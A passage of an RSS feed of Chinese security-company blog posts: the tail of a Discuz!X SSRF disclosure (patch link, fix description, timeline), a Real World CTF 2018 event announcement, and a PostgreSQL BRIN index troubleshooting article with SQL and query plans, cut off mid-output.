xyyyzzz&lt;/code&gt;&lt;p&gt;代码即再次执行成功。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;修复补丁&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Dz 参照了 WordPress 中的做法，对 url 的请求协议、端口做了白名单检查，并限制了请求 IP 地址不能为除了 localhost 以外的其他内网段地址，更重要的是不再跟随跳转。因此无法再通过 SSRF 利用 gopher 协议攻击 Dz 的缓存服务了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;时间线&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;2018/03/23：向 TSRC 报告两处 SSRF&lt;/li&gt;&lt;li&gt;2018/03/26：TSRC 确认漏洞存在，并准备进行漏洞修复&lt;/li&gt;&lt;li&gt;2018/04/09 - 2018/08/01：协助 TSRC 进行漏洞修复&lt;/li&gt;&lt;li&gt;2018/11/06：DiscuzX 在 gitee 上提交补丁 commit&lt;/li&gt;&lt;li&gt;2018/12/09：公开漏洞详情&lt;/li&gt;&lt;/ul&gt;</description>
<author>voidfyoo</author>
<guid isPermaLink="false">2018-12-09-51907363</guid>
<pubDate>Sun, 09 Dec 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>史上最强国际CTF战队集结中国，48小时王者之战即将开启！</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-11-26-50860117.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/50860117&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ba108e383d784fb65da8431c365ae54d_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;史上最强国际顶尖战队集结&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;5&lt;/b&gt;大洲&lt;/p&gt;&lt;p&gt;&lt;b&gt;15&lt;/b&gt;个国家地区&lt;/p&gt;&lt;p&gt;&lt;b&gt;20&lt;/b&gt;支战队&lt;/p&gt;&lt;p&gt;近&lt;b&gt;5&lt;/b&gt;年共计获得&lt;b&gt;150&lt;/b&gt;次CTF全球冠军&lt;/p&gt;&lt;p&gt;&lt;b&gt;100&lt;/b&gt;名最强CTF选手&lt;/p&gt;&lt;p&gt;&lt;b&gt;48&lt;/b&gt;小时不间断赛制&lt;/p&gt;&lt;p&gt;&lt;b&gt;12月1-2日，中国郑州&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;长亭科技&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;首届Real World国际CTF网络安全大赛&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;线下总决赛&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;大幕开启！&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-affbe1d1a09de310e9f3acc35ff5c3ce_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1282&quot; data-rawheight=&quot;526&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-affbe1d1a09de310e9f3acc35ff5c3ce&quot; data-watermark-src=&quot;v2-14d24f69d450e50b14a35e62f2965a7c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;集结全球最强战队&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;入围总决赛的20支国际战队的100名参赛选手，从7月份的全球700多支战队近2000名选手经过激烈的角逐胜出。&lt;/b&gt;参加初赛及决赛对决的战队名单星光熠熠，包括CTF TIME 2017位列第一的217、强强联合的Eat Sleep Pwn Repeat、来自卡内基梅隆大学的明星战队PPP、获得多年Hack.lu CTF冠军的波兰战队Dragon Sector、获DEFCON CTF 2015世界冠军的韩国战队CyKor……更有本次比赛中平均年龄最小的00后天才少年战队Perfect Blue加入，近五年来全球最强的CTF力量将汇聚中国。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6de9ac3e9bab67ccd22fa256d5070b09_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;854&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6de9ac3e9bab67ccd22fa256d5070b09&quot; data-watermark-src=&quot;v2-4d927ceca21e967d722c01639fb96869&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;全球首发创新赛制&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;Real World CTF全球首创基于真实世界软件的全新CTF赛制，结合CTF夺旗赛和Pwn赛的优势，所有赛题全部基于真实世界软件的修改或二次开发来命题。&lt;/b&gt;这种模式不仅延续了传统CTF赛事中命题灵活、难度可控的特点，同时也能让参赛者在解题过程中挑战和体验Pwn赛中才会有的真实世界软件攻防技术。惊险刺激的线上赛体验，已收获CTF TIME上众多CTFer好评。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dcdf54edaec74d56bed85357cfc9b743_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;709&quot; data-rawheight=&quot;686&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-dcdf54edaec74d56bed85357cfc9b743&quot; data-watermark-src=&quot;v2-1f16577ad750ec97161e2433e655c287&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;线下赛将呈现出纷呈的现场效果，CTF赛制和现场完全仿真的环境搭建，真实呈现虚拟空间的网络安全技术与真实世界的息息相关。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-69f68405f60570374341616998014c13_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;663&quot; data-rawheight=&quot;679&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-69f68405f60570374341616998014c13&quot; data-watermark-src=&quot;v2-b8a7f8ce799355cac9b80c07050fdcdd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;全明星阵容命制高水平赛题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;Real World CTF命题团队成员毕业于清华大学、浙江大学、美国麻省理工学院、美国约翰霍普金斯大学等名校网络安全相关专业，曾经获得“黑客世界杯”DEFCON CTF全球亚军，至今保持中国战队的最高成绩；近5年来，命题团队成员累计获得国际大赛前三名5次，全国网络安全大赛冠军累计超过20次。&lt;/b&gt;命题团队成员多数来自“蓝莲花战队”，是中国CTF网络安全赛制的引入者，早在2014年就在国内首次举办了全国范围的BCTF，并从2015年开始，连续多年举办BCTF国际网络安全大赛，每年全球参赛队伍超过500支，拥有多年的国际大赛命题经验。命题专家均为全球顶级安全研究员，曾经为微软、苹果、谷歌、思科、华为、联想、腾讯、阿里等知名企业提交漏洞并协助修复严重安全问题，并在国内外知名黑客破解大赛Pwn2Own、GeekPwn中累计获得奖金超过300万。专家们结合国际顶尖的网络安全技术，将最新研究思路与成果融入赛题，涉及多个前沿研究领域，场景新颖全面，赛题整体难度较高。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-039175f08f38fd743e7d95dfe99ce435_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;119&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;7月的线上赛，多道赛题在比赛结束时仍未有选手解出。线下赛题会有什么样惊喜，期待比赛现场一探究竟！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;技术互动&amp;amp;论坛激辩未来安全&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;此外，比赛现场更有来自腾讯玄武实验室、盘古、360Unicon Team、GeekPwn、清华大学、长亭科技带来的HackValley体验区，供观众现场感受智能时代变化多端的新型攻击手法，在日常生活中提升网络安全意识。&lt;/p&gt;&lt;p&gt;48小时不间断赛后，12月3日的技术论坛将邀请国内外技术顶尖高手和赛场上的选手进行技术思路分享，议题涉及容器安全、区块链安全、渗透测试、逆向工程等多个方向。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;观众预约&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;本次大赛参观采取注册制预约开放，&lt;/b&gt;您可点击注册链接，填写相关信息，成功注册后，即获得大赛观众资格。您可参观选手比赛区一睹超强战队激战盛况、在Hack Valley体验区亲身体验极客脑暴、在网络安全技术论坛学习全球顶尖黑客的前沿研究成果。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt; 官网地址 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;www.realworldctf.cn&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt; 开放时间 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;赛区：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;12月1日 09:00-19:00（固定时段开放）&lt;/p&gt;&lt;p&gt;12月2日 09:00-17:00（固定时段开放）&lt;/p&gt;&lt;p&gt;&lt;b&gt;Hack Valley体验区：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;12月1日 09:00-20:00 （全天开放）&lt;/p&gt;&lt;p&gt;12月2日 09:00-17:00 （全天开放）&lt;/p&gt;&lt;p&gt;&lt;b&gt;论坛区：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;12月3日 09:00-18:00 （全天开放）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;20支全球最强战队&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;谁将问鼎Real World CTF 2018冠军？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;敬请期待！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-340c38b4a6904818160c5c53d1376f31_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;677&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-340c38b4a6904818160c5c53d1376f31&quot; data-watermark-src=&quot;v2-64a1f649089411a28d30d0e30f50d922&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-11-26-50860117</guid>
<pubDate>Mon, 26 Nov 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>PostgreSQL BRIN 索引使用的那些坑</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-11-26-50167673.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/50167673&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e76722021801a9b5ec09a608443a7148_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者：@monouno，现实习于长亭科技&lt;/p&gt;&lt;p&gt;BRIN 索引（块范围索引，Block Range Indexes）是 PostgreSQL 9.5 版本新增的索引类型。该索引维护每一定范围内数据块的最大最小值和其他一些统计数据，当数据库查询时可根据索引的统计信息筛选出不符合查询条件的数据块，以避免全表扫描，提高性能和减少 IO。和 BTree 索引比较所占用的空间足够小[1]，因此 BRIN 索引一般用于线性相关较强字段的精确和范围查询，如在一张很大的日志表中通过 id 或时间查询。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;创建测试数据&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;创建数据表，只含有一个 id 字段&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;CREATE TABLE example AS SELECT generate_series(1, 100000000) AS id;&lt;/code&gt;&lt;p&gt;数据表大小为 &lt;code class=&quot;inline&quot;&gt;3.4G&lt;/code&gt; &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\dt+ example

                      List of relations
 Schema |  Name   | Type  |  Owner   |  Size   | Description
--------+---------+-------+----------+---------+-------------
 public | example | table | safeline | 3457 MB |
(1 row)&lt;/code&gt;&lt;p&gt;创建索引&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;CREATE INDEX idx ON example USING brin(id) WITH (pages_per_range=1024, autosummarize=on);&lt;/code&gt;&lt;p&gt;索引大小为 &lt;code class=&quot;inline&quot;&gt;56K&lt;/code&gt; &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\dti+ idx

                        List of relations
 Schema | Name | Type  |  Owner   |  Table  | Size  | Description
--------+------+-------+----------+---------+-------+-------------
 public | idx  | index | safeline | example | 56 kB |
(1 row)&lt;/code&gt;&lt;p&gt;explain 一下 BRIN 索引使用情况&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;EXPLAIN ANALYZE SELECT * FROM example WHERE id = 492167;

                                                         QUERY PLAN
--------------------------------------------------------------------------------------------------------------------------------
 Gather  (cost=1016.26..807981.92 rows=1 width=4) (actual time=12.700..86.880 rows=1 loops=1)
   Workers Planned: 2
   Workers Launched: 2
   -&amp;gt;  Parallel Bitmap Heap Scan on example  (cost=16.26..806981.82 rows=1 width=4) (actual time=56.477..80.759 rows=0 loops=3)
         Recheck Cond: (id = 492167)
         Rows Removed by Index Recheck: 77141
         Heap Blocks: lossy=496
         -&amp;gt;  Bitmap Index Scan on idx  (cost=0.00..16.26 rows=230946 width=0) (actual time=0.377..0.377 rows=10240 loops=1)
               Index Cond: (id = 492167)
 Planning Time: 0.318 ms
 Execution Time: 86.950 ms
(11 rows)&lt;/code&gt;&lt;p&gt;索引很小，尝试使用 B-Tree 索引，体积会是 &lt;code class=&quot;inline&quot;&gt;2.1G&lt;/code&gt;，大约是数据本身的三分之二大小了。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;CREATE INDEX idx_btree ON example (id);
\dti+ idx_btree

                            List of relations
 Schema |   Name    | Type  |  Owner   |  Table  |  Size   | Description
--------+-----------+-------+----------+---------+---------+-------------
 public | idx_btree | index | safeline | example | 2142 MB |
(1 row)&lt;/code&gt;&lt;h2&gt;&lt;b&gt;BRIN 索引结构&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;BRIN 索引页的存储顺序依次是 &lt;code class=&quot;inline&quot;&gt;meta page&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;revmap pages&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;regular pages&lt;/code&gt;。我们通过 &lt;a href=&quot;https://www.postgresql.org/docs/current/pageinspect.html#id-1.11.7.31.6&quot;&gt;pageinspect&lt;/a&gt; 扩展可以很方便地分析 BRIN 索引的各个页。&lt;/p&gt;&lt;h2&gt;meta page&lt;/h2&gt;&lt;p&gt;第一页 &lt;code class=&quot;inline&quot;&gt;meta page&lt;/code&gt; 保存 BRIN 索引的元数据&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;SELECT * FROM brin_metapage_info(get_raw_page(&#39;idx&#39;, 0));

   magic    | version | pagesperrange | lastrevmappage
------------+---------+---------------+----------------
 0xA8109CFA |       1 |          1024 |              1
(1 row)&lt;/code&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;lastrevmapage&lt;/code&gt; 表示 &lt;code class=&quot;inline&quot;&gt;revmap pages&lt;/code&gt; 最后一页的下标，即从 &lt;code class=&quot;inline&quot;&gt;meta page&lt;/code&gt; 的下一页到 &lt;code class=&quot;inline&quot;&gt;lastrevmapage&lt;/code&gt; 都是 &lt;code class=&quot;inline&quot;&gt;revmap pages&lt;/code&gt;。&lt;/p&gt;&lt;h2&gt;revmap pages&lt;/h2&gt;&lt;p&gt;接下来的 revmap 相当于一个目录，保存数据块到索引记录的映射关系，而且每一页 revmap 的记录数是固定的。&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;SELECT * FROM brin_revmap_data(get_raw_page(&#39;idx&#39;, 1)) LIMIT 5;

 pages
-------
 (2,1)
 (2,2)
 (2,3)
 (2,4)
 (2,5)
(5 rows)&lt;/code&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/postgres/postgres/blob/master/src/backend/access/brin/brin_revmap.c&quot;&gt;下面的宏&lt;/a&gt;可以计算出一个数据块在 revmap 中的位置，然后可以在 revmap 中查询到索引的位置。&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;#define HEAPBLK_TO_REVMAP_BLK(pagesPerRange, heapBlk) \
    ((heapBlk / pagesPerRange) / REVMAP_PAGE_MAXITEMS)
#define HEAPBLK_TO_REVMAP_INDEX(pagesPerRange, heapBlk) \
    ((heapBlk / pagesPerRange) % REVMAP_PAGE_MAXITEMS)&lt;/code&gt;&lt;p&gt;所以在扫描和更新索引时（比如 &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin.c#L188&quot;&gt;brininsert&lt;/a&gt; 等函数），可以简单的计算出一个数据块属于哪一条索引记录[2]。&lt;/p&gt;&lt;p&gt;如果对应块索引还未被创建，那么该项就是 &lt;code class=&quot;inline&quot;&gt;(0, 0)&lt;/code&gt;。随着表数据行和索引记录的不断增加，索引的 &lt;code class=&quot;inline&quot;&gt;revmap pages&lt;/code&gt; 也会向后扩展，为了给这腾出位置，PostgreSQL 会从前面开始将 &lt;code class=&quot;inline&quot;&gt;regular pages&lt;/code&gt; 中的索引条目移到末尾，并更新和拓展 &lt;code class=&quot;inline&quot;&gt;revmap&lt;/code&gt;。&lt;/p&gt;&lt;h2&gt;regular page&lt;/h2&gt;&lt;p&gt;可以通过 &lt;code class=&quot;inline&quot;&gt;brin_page_items&lt;/code&gt; 查看索引记录&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;SELECT * FROM brin_page_items(get_raw_page(&#39;idx&#39;, 2), &#39;idx&#39;) LIMIT 5;

 itemoffset | blknum | attnum | allnulls | hasnulls | placeholder |        value
------------+--------+--------+----------+----------+-------------+---------------------
          1 |      0 |      1 | f        | f        | f           | {1 .. 231424}
          2 |   1024 |      1 | f        | f        | f           | {231425 .. 462848}
          3 |   2048 |      1 | f        | f        | f           | {462849 .. 694272}
          4 |   3072 |      1 | f        | f        | f           | {694273 .. 925696}
          5 |   4096 |      1 | f        | f        | f           | {925697 .. 1157120}
(5 rows)&lt;/code&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;blknum&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;attnum&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;allnulls&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;hasnulls&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;value&lt;/code&gt; 分别表示起始块数、字段下标、是否全为空值、是否存在空值和块范围内字段的最大最小值。这其中最重要的就是 value 这个字段了。PostgreSQL 一般就是根据这个 value 值来判断是否需要扫描这些数据块。以第三个条目为例，它的 &lt;code class=&quot;inline&quot;&gt;blknum&lt;/code&gt; 为 2048，说明是 2048 - 3072 数据块存储的数据范围是 &lt;code class=&quot;inline&quot;&gt;462849 .. 694272&lt;/code&gt;。如果我们查询的 SQL 是 &lt;code class=&quot;inline&quot;&gt;WHERE id = 492167&lt;/code&gt;，那在这些数据块中再搜索就足够了。&lt;/p&gt;&lt;p&gt;BRIN 索引的 &lt;code class=&quot;inline&quot;&gt;pages_per_range&lt;/code&gt; 可指定单条索引记录所统计的数据块范围，默认为 128。值越小统计的粒度就越小，索引的过滤性越好，但索引也会越大。由于每筛选一次字段 PostgreSQL 都要扫描全部的 BRIN 索引，所花费的时间也会变长，因此需要根据表的大小与应用场景去调整其值的大小。&lt;/p&gt;&lt;p&gt;当一些在索引条目边界的行被删除时，会使原有的索引条目失效，失效的索引条目需要重新统计。也可以通过 &lt;code class=&quot;inline&quot;&gt;brin_desummarize_range&lt;/code&gt; 手动将一些索引条目失效。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我们遇到的问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们有一张日志表需要不断插入大量请求日志，在用户浏览日志列表或是查看日志详情时需要进行等值或范围查询，起初在对 BRIN 索引进行测试时，先对日志表插入大量数据再建立索引进行查询，或是将之前归档的日志数据恢复再进行查询均有着不错的性能表现，但再进一步使用真实场景测试一段时间后发现日志查询变得非常慢，和之前的结果相差甚远。&lt;/p&gt;&lt;h2&gt;只要数据插入足够快，索引就跟不上我&lt;/h2&gt;&lt;p&gt;PostgreSQL 在插入或更新行时会更新已存在的索引条目，对应的索引条目不存在时则跳过。而在 &lt;code class=&quot;inline&quot;&gt;vacuum&lt;/code&gt; 或显式调用 &lt;code class=&quot;inline&quot;&gt;brin_summarize_new_values&lt;/code&gt; 时才会为表中未统计的数据块新增索引条目。从 PostgreSQL 10 开始新增 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 参数，开启 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 后，当表不断被插入新的行导致新增的数据块大于 &lt;code class=&quot;inline&quot;&gt;pages_per_range&lt;/code&gt; 时，将会自动统计这些新增的数据块并为此插入新的索引条目。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 并不会立即开始且都会成功，它尝试在 &lt;code class=&quot;inline&quot;&gt;AutoAacuumWork&lt;/code&gt; 的请求队列中追加一项 &lt;code class=&quot;inline&quot;&gt;AVW_BRINSummarizeRange&lt;/code&gt; 的任务，而这个任务便是调用 &lt;code class=&quot;inline&quot;&gt;summarize_range&lt;/code&gt; 函数[3]。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if (!lastPageTuple)
{
    bool        recorded;

    recorded = AutoVacuumRequestWork(AVW_BRINSummarizeRange,
                                        RelationGetRelid(idxRel),
                                        lastPageRange);
    if (!recorded)
        ereport(LOG,
                (errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),
                    errmsg(&quot;request for BRIN range summarization for index \&quot;%s\&quot; page %u was not recorded&quot;,
                        RelationGetRelationName(idxRel),
                        lastPageRange)));
}
else
    LockBuffer(buf, BUFFER_LOCK_UNLOCK);&lt;/code&gt;&lt;p&gt;请求队列的长度 &lt;code class=&quot;inline&quot;&gt;NUM_WORKITEMS&lt;/code&gt; 是固定的，默认为 256。在 &lt;code class=&quot;inline&quot;&gt;autovacuum_work&lt;/code&gt; 执行 &lt;code class=&quot;inline&quot;&gt;do_autovacuum&lt;/code&gt; 时处理这些任务[4]。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/*
 * Perform additional work items, as requested by backends.
 */
LWLockAcquire(AutovacuumLock, LW_EXCLUSIVE);
for (i = 0; i &amp;lt; NUM_WORKITEMS; i++)
{
    AutoVacuumWorkItem *workitem = &amp;amp;AutoVacuumShmem-&amp;gt;av_workItems[i];

    if (!workitem-&amp;gt;avw_used)
        continue;
    if (workitem-&amp;gt;avw_active)
        continue;
    if (workitem-&amp;gt;avw_database != MyDatabaseId)
        continue;

    /* claim this one, and release lock while performing it */
    workitem-&amp;gt;avw_active = true;
    LWLockRelease(AutovacuumLock);

    perform_work_item(workitem);

    /*
     * Check for config changes before acquiring lock for further jobs.
     */
    CHECK_FOR_INTERRUPTS();
    if (got_SIGHUP)
    {
        got_SIGHUP = false;
        ProcessConfigFile(PGC_SIGHUP);
    }

    LWLockAcquire(AutovacuumLock, LW_EXCLUSIVE);

    /* and mark it done */
    workitem-&amp;gt;avw_active = false;
    workitem-&amp;gt;avw_used = false;
}
LWLockRelease(AutovacuumLock);&lt;/code&gt;&lt;p&gt;当前 &lt;code class=&quot;inline&quot;&gt;AutoVacuumWorkItemType&lt;/code&gt; 只有 &lt;code class=&quot;inline&quot;&gt;AVW_BRINSummarizeRange&lt;/code&gt; 这一种，在 PostgreSQL 未来的版本很可能会继续使用这一框架，新增更多来自 backend 的任务类型。&lt;/p&gt;&lt;p&gt;当请求队列已满且 &lt;code class=&quot;inline&quot;&gt;autovacuum_work&lt;/code&gt; 来不及处理时 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 就会失败。只要数据插入足够快，索引就跟不上我，所以即便是开启了 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt;，在大量数据被不断插入表中的情况下，请求队列会被迅速占满，导致 &lt;code class=&quot;inline&quot;&gt;autosummarize&lt;/code&gt; 失败，出现大量错误日志：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;XXXX-XX-XX 09:39:55.832 UTC [67] LOG:  request for BRIN range summarization for index &quot;idx&quot; page 58311 was not recorded&lt;/code&gt;&lt;p&gt;BRIN 索引需要定期被更新，否则就可能存在大量还未索引的记录，还有数据更新也导致一些索引条目失效或统计出现偏差。在 BRIN 索引不完整时过滤性能变差，无论查询的记录是否在已存在的索引条目中，在 Heap bitmap index scan 之后仍需要重新 Recheck 未统计的数据块，速度可能会变得非常缓慢，从原来的十几毫秒延长到几秒是有可能的，进而影响相关的业务系统。下面是一个比较极端的情况下的查询。&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;

                                                       QUERY PLAN
-------------------------------------------------------------------------------------------------------------------------
 Bitmap Heap Scan on example  (cost=12.03..50726.88 rows=1 width=37) (actual time=19.317..6047.938 rows=1900 loops=1)
   Recheck Cond: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
   Rows Removed by Index Recheck: 39598741
   Heap Blocks: lossy=330006
   Buffers: shared hit=1 read=330007
   -&amp;gt;  Bitmap Index Scan on idx  (cost=0.00..12.03 rows=15355 width=0) (actual time=19.085..19.085 rows=3301120 loops=1)
         Index Cond: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
         Buffers: shared hit=1 read=1
 Planning Time: 0.782 ms
 Execution Time: 6048.140 ms
(10 rows)&lt;/code&gt;&lt;p&gt;对比使用 Parallel Seq Scan 的查询：&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;

                                                          QUERY PLAN
------------------------------------------------------------------------------------------------------------------------------
 Gather  (cost=1000.00..584334.60 rows=1 width=37) (actual time=1.751..1645.756 rows=1900 loops=1)
   Workers Planned: 2
   Workers Launched: 2
   Buffers: shared hit=16219 read=317115
   -&amp;gt;  Parallel Seq Scan on example  (cost=0.00..583334.50 rows=1 width=37) (actual time=1089.990..1635.938 rows=633 loops=3)
         Filter: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
         Rows Removed by Filter: 13332700
         Buffers: shared hit=16219 read=317115
 Planning Time: 0.659 ms
 Execution Time: 1646.008 ms
(10 rows)&lt;/code&gt;&lt;h2&gt;autovacuum 为什么也没用&lt;/h2&gt;&lt;p&gt;上面一节提到了问题可能是 &lt;code class=&quot;inline&quot;&gt;AutoAacuumWork&lt;/code&gt; 队列已满，但是日常运行的 &lt;code class=&quot;inline&quot;&gt;autovacuum&lt;/code&gt; 也应该可以实现相同的效果，为什么也没用呢。为了方便测试，我们可单独将表运行 &lt;code class=&quot;inline&quot;&gt;autovacuum&lt;/code&gt; 的相关阈值调低，其他保持则默认值：&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;ALTER TABLE example SET (autovacuum_vacuum_scale_factor = 0.0);
ALTER TABLE example SET (autovacuum_vacuum_threshold = 100);&lt;/code&gt;&lt;p&gt;然后根据我们的业务场景，不断在表中插入大量数据，然后观察 &lt;code class=&quot;inline&quot;&gt;pg_stat_user_tables&lt;/code&gt; 中记录：&lt;/p&gt;&lt;code lang=&quot;sql&quot;&gt;SELECT * FROM pg_stat_user_tables where relname = &#39;example&#39;;

-[ RECORD 1 ]-------+------------------------------
relid               | 32824
schemaname          | public
relname             | example
seq_scan            | 81
seq_tup_read        | 202398405
idx_scan            | 5
idx_tup_fetch       | 198003205
n_tup_ins           | 110000010
n_tup_upd           | 0
n_tup_del           | 0
n_tup_hot_upd       | 0
n_live_tup          | 110000000
n_dead_tup          | 0
n_mod_since_analyze | 0
last_vacuum         |
last_autovacuum     |
last_analyze        |
last_autoanalyze    | xxxx-xx-xx 08:31:25.114953+00
vacuum_count        | 0
autovacuum_count    | 0
analyze_count       | 0
